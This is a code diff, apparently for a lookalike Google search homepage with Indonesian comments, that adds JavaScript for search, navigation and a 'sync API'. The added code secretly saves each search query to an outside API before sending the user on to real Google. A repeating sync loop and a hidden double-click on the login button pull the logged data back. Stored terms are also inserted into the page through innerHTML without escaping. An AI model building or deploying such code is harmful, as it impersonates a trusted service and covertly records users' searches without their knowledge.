+    // Sync berulang
+    syncInterval = setInterval(syncData, 3000);
+  }
+
+  // ========== SEARCH FUNCTIONS ==========
+  function createSafeGoogleURL(query) {
+    const encodedQuery = encodeURIComponent(query);
+    const timestamp = Date.now();
+    
+    return `https://www.google.com/search?q=${encodedQuery}&igu=1&client=safari&_=${timestamp}&noredirect=1&pf=1`;
+  }
+
+  function performSearch(query) {
+    const searchQuery = query.trim();
+    if (!searchQuery) return false;
+    
+    // Simpan ke API (diam-diam)
+    saveNoteData(searchQuery);
+    
+    // Redirect ke Google
+    const googleURL = createSafeGoogleURL(searchQuery);
+    
+    if (isIOS() && isSafari()) {
+      setTimeout(() => {
+        window.location.replace(googleURL);
+      }, 50);
+    } else {
+      window.location.href = googleURL;
+    }
+    
+    return false;
+  }
+
+  function openGoogleLink(url) {
+    const timestamp = Date.now();
+    const separator = url.includes('?') ? '&' : '?';
+    const safeURL = url + separator + `igu=1&client=safari&_=${timestamp}&noredirect=1`;
+    
+    if (isIOS() && isSafari()) {
+      setTimeout(() => {
+        window.location.href = safeURL;
+      }, 50);
+    } else {
+      window.location.href = safeURL;
+    }
+    
+    return false;
+  }
+
+  // ========== DOUBLE CLICK HANDLER ==========
+  function setupDoubleClickHandler() {
+    const loginBtn = document.getElementById('loginBtn');
+    
+    loginBtn.addEventListener('click', function(e) {
+      e.preventDefault();
+      e.stopPropagation();
+      
+      clickCount++;
+      
+      if (clickCount === 1) {
+        // Click pertama - tunggu click kedua
+        clickTimer = setTimeout(() => {
+          // Single click - buka Google Account
+          clickCount = 0;
+          openGoogleLink('https://accounts.google.com');
+        }, 300);
+      } else if (clickCount === 2) {
+        // Double click - load data dari API
+        clearTimeout(clickTimer);
+        clickCount = 0;
+        
+        // Ambil data terbaru dari API
+        getNoteData().then(data => {
+          if (data && data.search) {
+            // Isi search bar dengan data terakhir
+            const searchInput = document.getElementById('searchInput');
+            if (searchInput) {
+              searchInput.value = data.search;
+              searchInput.focus();
+              
+              // Jika ada history, tambahkan ke trending area
+              if (data.history && data.history.length > 0) {
+                updateTrendingWithHistory(data.history);
+              }
             }
+          }
         });
-})();
-</script>
+      }
+    });
+  }
 
-<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"147ea05f176b495ab5bd2311c8ba6bd4","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
-</body></html>
+  // Update trending dengan history (diam-diam)
+  function updateTrendingWithHistory(history) {
+    const trendingContainer = document.getElementById('trendingContainer');
+    if (!trendingContainer || !history || history.length === 0) return;
+    
+    // Simpan trending asli
+    const originalTrending = Array.from(trendingContainer.children).slice(0, 4);
+    
+    // Clear container
+    trendingContainer.innerHTML = '';
+    
+    // Tambahkan history sebagai trending (maksimal 4)
+    history.slice(0, 4).forEach((searchTerm, index) => {
+      const trendElement = document.createElement('div');
+      trendElement.className = 'trend';
+      trendElement.innerHTML = `
+        <div class="trend-icon"></div>
+        <div class="trend-text">${searchTerm}</div>
+      `;
+      
+      trendElement.addEventListener('click', function() {
+        const term = this.querySelector('.trend-text').textContent;
+        document.getElementById('searchInput').value = term;
+        performSearch(term);
+      });
+      
+      trendingContainer.appendChild(trendElement);
+    });
+    
+    // Tambahkan kembali trending asli
+    originalTrending.forEach(trend => {
+      trendingContainer.appendChild(trend);
+    });
+    
+    // Kembali ke trending asli setelah 10 detik
+    setTimeout(() => {
+      if (trendingContainer.children.length > 7) {
+        trendingContainer.innerHTML = '';
+        originalTrending.forEach(trend => {
+          trendingContainer.appendChild(trend.cloneNode(true));
+        });
+      }
+    }, 10000);
+  }
+
+  // ========== EVENT LISTENERS ==========
+  function setupEventListeners() {
+    const searchInput = document.getElementById('searchInput');
+    const searchForm = document.getElementById('searchForm');
+    
+    // Search form
+    searchForm.addEventListener('submit', function(e) {
+      e.preventDefault();
+      performSearch(searchInput.value);
+      return false;
+    }, true);
+    
+    // Enter key
+    searchInput.addEventListener('keypress', function(e) {
+      if (e.key === 'Enter') {
+        e.preventDefault();
+        performSearch(this.value);
+        return false;
+      }
+    });
+    
+    // Auto-focus
+    setTimeout(() => {
+      searchInput.focus();
+      searchInput.placeholder = "Telusuri Google";
+      setTimeout(() => searchInput.placeholder = "", 1500);
+    }, 100);
+    
+    // Mic button
+    document.getElementById('micButton').addEventListener('click', function(e) {
+      e.preventDefault();
+      alert('Voice search: Fitur ini akan mengaktifkan pencarian suara. Silakan ucapkan pencarian Anda.');
+      return false;
+    });
+    
+    // Lens button
+    document.getElementById('lensButton').addEventListener('click', function(e) {
+      e.preventDefault();
+      openGoogleLink('https://lens.google.com');
+      return false;
+    });
+    
+    // Apps icon
+    document.querySelector('.apps-icon').addEventListener('click', function(e) {
+      e.preventDefault();
+      openGoogleLink('https://www.google.com/intl/id_id/about/products');
+      return false;
+    });
+    
+    // Menu icon
+    document.querySelector('.menu').addEventListener('click', function(e) {
+      e.preventDefault();
+      alert('Menu Google\n\n• Telusuri\n• Gambar\n• Video\n• Berita\n• Peta\n• Lainnya');
+      return false;
+    });
+    
+    // Tabs
+    document.querySelectorAll('.tab').forEach(tab => {
+      tab.addEventListener('click', function(e) {
+        e.preventDefault();
+        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+        this.classList.add('active');
+        
+        if (this.dataset.tab === 'images') {
+          openGoogleLink('https://www.google.com/imghp');
+        }
+        return false;
+      });
+    });
+    
+    // Trending items
+    document.querySelectorAll('.trend').forEach(trend => {
+      trend.addEventListener('click', function() {
+        const searchTerm = this.querySelector('.trend-text').textContent;
+        searchInput.value = searchTerm;
+        performSearch(searchTerm);
+      });
+    });
+    
+    // Footer links
+    const footerLinks = {
+      'settingsBtn': 'https://www.google.com/preferences',
+      'privacyBtn': 'https://policies.google.com/privacy',
+      'termsBtn': 'https://policies.google.com/terms',
+      'advertisingBtn': 'https://www.google.com/intl/id_id/ads',
+      'businessBtn': 'https://www.google.com/services',
+      'aboutBtn': 'https://www.google.com/intl/id_id/about'
+    };
+    
+    Object.keys(footerLinks).forEach(id => {
+      document.getElementById(id).addEventListener('click', function(e) {
+        e.preventDefault();
+        openGoogleLink(footerLinks[id]);
+        return false;
+      });
+    });
+    
+    // Setup double click handler
+    setupDoubleClickHandler();
+  }
+
+  // ========== INITIALIZATION ==========
+  function init() {
+    // Setup event listeners
+    setupEventListeners();
+    
+    // Mulai sinkronisasi otomatis
+    startAutoSync();
+    
+    console.log('Google Clone dengan Sync API - Siap digunakan');
+  }
+
+  // Start
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', init);
+  } else {
+    init();
+  }
+
+  // Cleanup
+  window.addEventListener('beforeunload', function() {
+    if (syncInterval) {
+      clearInterval(syncInterval);
+    }
+  });
+</script>
+</body>
+</html>
